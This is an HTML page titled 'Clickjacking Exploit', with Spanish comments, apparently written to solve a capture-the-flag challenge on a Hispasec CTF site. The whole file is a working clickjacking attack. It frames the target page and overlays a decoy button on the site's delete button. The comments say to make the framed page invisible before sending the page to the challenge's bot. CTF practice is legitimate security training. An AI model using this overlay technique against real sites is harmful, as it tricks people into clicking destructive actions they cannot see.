<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking Exploit</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        /* Contenedor principal */
        #wrapper {
            position: relative;
            width: 100%;
            height: 1000px;
        }

        /* La web del CTF (La víctima) */
        iframe {
            width: 100%;
            height: 1000px;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            /* 1. AJUSTE: Pon esto en 0.5 para probar tú mismo si coincide, 
               luego cámbialo a 0.0 para enviárselo al bot */
            opacity: 0.5; 
        }

        /* Tu botón invisible (El objetivo del bot) */
        #objetivo {
            position: absolute;
            z-index: 2;
            
            /* 2. COORDENADAS ESTIMADAS */
            /* El botón de borrar suele estar al final, tras el formulario */
            top: 850px;     /* Ajusta este valor si ves que no cae encima */
            left: 50px;     /* El contenedor tiene clase 'container', suele estar centrado o a la izquierda */
            
            /* Dimensiones para cubrir el botón real */
            width: 200px;
            height: 50px;
            
            /* Estética para las pruebas */
            background: red;
            color: white;
            cursor: pointer;
            border: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="wrapper">
        <button id="objetivo">¡CLICK AQUÍ!</button>

        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
